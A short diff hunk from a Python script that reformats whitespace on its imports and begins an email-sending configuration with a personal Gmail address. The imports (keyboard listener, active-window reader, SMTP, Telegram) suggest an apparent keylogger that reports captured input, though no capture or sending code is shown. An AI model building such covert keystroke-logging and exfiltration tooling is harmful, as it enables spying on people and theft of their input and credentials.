@@ -1,15 +1,15 @@
-from pynput import keyboard
-import pygetwindow as gw
-import time
-import smtplib
-import threading
-import asyncio
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-import telegram
-from datetime import datetime
+from pynput import keyboard 
+import pygetwindow as gw 
+import time 
+import smtplib 
+import threading 
+import asyncio 
+from email.mime.multipart import MIMEMultipart 
+from email.mime.text import MIMEText 
+from email.mime.base import MIMEBase 
+from email import encoders 
+import telegram 
+from datetime import datetime 
 
 # --- CONFIGURATION DE L'ENVOI D'EMAIL ---
 EMAIL_ADDRESS = "nkenfackloic2002@gmail.com"
